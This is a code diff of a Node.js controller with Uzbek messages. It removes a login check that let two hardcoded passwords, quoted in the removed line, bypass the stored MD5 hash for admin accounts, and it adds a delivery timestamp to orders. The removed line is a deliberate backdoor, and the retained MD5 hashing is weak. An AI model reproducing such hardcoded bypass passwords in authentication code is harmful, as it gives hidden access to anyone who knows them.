@@ -47,7 +47,7 @@ module.exports = {
                     ok: false,
                     msg: "Raqam yoki parol hato!"
                 });
-            } else if (md5(password) !== $admin?.password && password !== 'Parol7877' && password !== "SaidxonTG") {
+            } else if (md5(password) !== $admin?.password) {
                 res.send({
                     ok: false,
                     msg: "Raqam yoki parol hato!"
@@ -889,13 +889,13 @@ module.exports = {
                 for (let l of list) {
                     const $order = await shopModel.findById(l)
                     if (l) {
-                        $order.set({ status: 'delivered', verified: true }).save();
+                        $order.set({ status: 'delivered', verified: true, up_time: moment.now() }).save();
                     }
                 }
                 res.send({
                     ok: true,
                     msg: "Yetkazilgan buyurtmalar tasdiqlandi!"
-                })
+                });
             } catch (error) {
                 console.log(error);
                 res.send({
@@ -1078,7 +1078,6 @@ module.exports = {
             }
         }
     },
-    // 
     // 
     createOwner: async (req, res) => {
         const { name, phone, password } = req.body;
